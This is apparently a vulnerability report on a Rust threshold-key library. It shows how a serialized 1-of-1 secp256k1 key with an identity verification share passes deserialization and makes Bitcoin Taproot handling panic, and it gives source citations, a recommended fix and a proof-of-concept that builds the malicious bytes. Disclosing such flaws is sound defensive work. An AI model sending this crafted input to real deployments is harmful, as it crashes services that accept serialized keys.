### Title
Deserialized secp256k1 `ThresholdKeys` may contain identity verification shares, producing an identity group key that panics Bitcoin Taproot handling - ([File: crypto/dkg/src/lib.rs](crypto/dkg/src/lib.rs))

### Summary
`ThresholdKeys::<Secp256k1>::read` deserializes verification shares through `Ciphersuite::read_G`, which enforces canonical point encodings but does not reject the point at infinity. `ThresholdKeys::new` only checks the number and participant indexes of those shares; it does not reject identity shares or an identity aggregate group key. A serialized 1-of-1 key whose sole verification share is infinity therefore deserializes successfully with an identity `group_key`. Passing that result to Bitcoin Taproot key handling calls `p2tr_script_buf` / `x_only`, whose implementation explicitly panics for infinity.

### Finding Description
`ThresholdKeys::read` reads each verification share with `<C as Ciphersuite>::read_G` and then invokes `ThresholdKeys::new`. [1](#0-0)  The generic `Ciphersuite::read_G` rejects malformed or non-canonical encodings, but it does not reject identity. [2](#0-1)  In contrast, FROST's `Curve::read_G` explicitly rejects identity, but that stricter wrapper is not used by `ThresholdKeys::read`. [3](#0-2) 

`ThresholdKeys::new` validates the map size and upper participant bound, but it performs no nonzero-point check and computes `group_key` by summing the first `t` verification shares. [4](#0-3)  Thus a crafted `ThresholdKeys` object can carry an identity group key.

Bitcoin Taproot conversion calls `x_only`, and `x` panics when the point's SEC1 encoding has no x-coordinate, as is the case for infinity. [5](#0-4)  `p2tr_script_buf` invokes `x_only` after its even-Y check, rather than returning a decoding error for an unusable point. [6](#0-5) 

### Impact Explanation
An unprivileged party that can supply serialized `ThresholdKeys` bytes can cause a reachable panic when those keys are converted for Bitcoin Taproot scanning or spending. This is a remotely triggerable denial of service analogous to the reported optimizer crash class: a syntactically valid input reaches an unchecked exceptional state and crashes the caller instead of returning an error.

### Likelihood Explanation
The malicious encoding is small and deterministic. For a 1-of-1 secp256k1 key, the attacker only needs the expected ciphersuite identifier, `t = n = i = 1`, Lagrange interpolation, any canonical secret-share encoding, and the canonical encoding of the identity point as the sole verification share. `ThresholdKeys::new` then computes an identity group key without rejecting it.

Reachability depends on the integration accepting serialized threshold keys from untrusted input and subsequently calling `Scanner::new`, `p2tr_script_buf`, or another path using `x_only`.

### Recommendation
Reject identity points when deserializing threshold verification shares. The narrowest fix is to use a nonzero-point read for `ThresholdKeys::read`, or explicitly check each `verification_shares` value and the resulting `group_key` for identity in `ThresholdKeys::new`. Bitcoin-specific callers should still treat `ProjectivePoint::identity()` as invalid before calling `x_only`.

### Proof of Concept
Conceptual Rust PoC:

```rust
use k256::ProjectivePoint;
use frost::{curve::Secp256k1, ThresholdKeys};
use bitcoin_serai::wallet::Scanner;
use ciphersuite::{group::GroupEncoding, Ciphersuite};

let mut serialized = Vec::new();

// Ciphersuite ID expected by ThresholdKeys::read.
serialized.extend(9u32.to_le_bytes());
serialized.extend(b"secp256k1");

// ThresholdParams: t = 1, n = 1, i = 1.
serialized.extend(1u16.to_le_bytes());
serialized.extend(1u16.to_le_bytes());
serialized.extend(1u16.to_le_bytes());

// Interpolation::Lagrange.
serialized.push(1);

// Secret share: canonical zero is accepted by read_F.
serialized.extend([0u8; 32]);

// Sole verification share: canonical infinity encoding.
serialized.extend(ProjectivePoint::IDENTITY.to_bytes().as_ref());

let keys =
  ThresholdKeys::<Secp256k1>::read(&mut serialized.as_slice()).unwrap();
assert!(bool::from(keys.group_key().is_identity()));

// Panics inside x_only/x when converting the identity group key to x-only form.
let _ = Scanner::new(keys.group_key());
```

The exact identity byte representation should be obtained with `ProjectivePoint::IDENTITY.to_bytes()` so that `read_G`'s canonical-encoding round-trip check succeeds.

### Citations

**File:** crypto/dkg/src/lib.rs (L355-378)
```rust
    if verification_shares.len() != usize::from(params.n()) {
      Err(DkgError::IncorrectAmountOfVerificationShares {
        n: params.n(),
        shares: verification_shares.len(),
      })?;
    }
    for participant in verification_shares.keys().copied() {
      if u16::from(participant) > params.n() {
        Err(DkgError::InvalidParticipant { n: params.n(), participant })?;
      }
    }

    match &interpolation {
      Interpolation::Constant(_) => {
        if params.t() != params.n() {
          Err(DkgError::InapplicableInterpolation("constant interpolation for keys where t != n"))?;
        }
      }
      Interpolation::Lagrange => {}
    }

    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L620-631)
```rust
    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }

    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```

**File:** crypto/ciphersuite/src/lib.rs (L91-100)
```rust
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let mut encoding = <Self::G as GroupEncoding>::Repr::default();
    reader.read_exact(encoding.as_mut())?;

    let point = Option::<Self::G>::from(Self::G::from_bytes(&encoding))
      .ok_or_else(|| io::Error::other("invalid point"))?;
    if point.to_bytes().as_ref() != encoding.as_ref() {
      Err(io::Error::other("non-canonical point"))?;
    }
    Ok(point)
```

**File:** crypto/frost/src/curve/mod.rs (L123-131)
```rust
  /// Read a point from a reader, rejecting identity.
  #[allow(non_snake_case)]
  fn read_G<R: Read>(reader: &mut R) -> io::Result<Self::G> {
    let res = <Self as Ciphersuite>::read_G(reader)?;
    if res.is_identity().into() {
      Err(io::Error::other("identity point"))?;
    }
    Ok(res)
  }
```

**File:** networks/bitcoin/src/crypto.rs (L10-23)
```rust
/// Get the x coordinate of a non-infinity point.
///
/// Panics on invalid input.
fn x(key: &ProjectivePoint) -> [u8; 32] {
  let encoded = key.to_encoded_point(true);
  (*encoded.x().expect("point at infinity")).into()
}

/// Convert a non-infinity point to a XOnlyPublicKey (dropping its sign).
///
/// Panics on invalid input.
pub(crate) fn x_only(key: &ProjectivePoint) -> XOnlyPublicKey {
  XOnlyPublicKey::from_slice(&x(key)).expect("x_only was passed a point which was infinity or odd")
}
```

**File:** networks/bitcoin/src/wallet/mod.rs (L80-86)
```rust
pub fn p2tr_script_buf(key: ProjectivePoint) -> Option<ScriptBuf> {
  if key.to_encoded_point(true).tag() != Tag::CompressedEvenY {
    return None;
  }

  Some(ScriptBuf::new_p2tr_tweaked(TweakedPublicKey::dangerous_assume_tweaked(x_only(&key))))
}
```
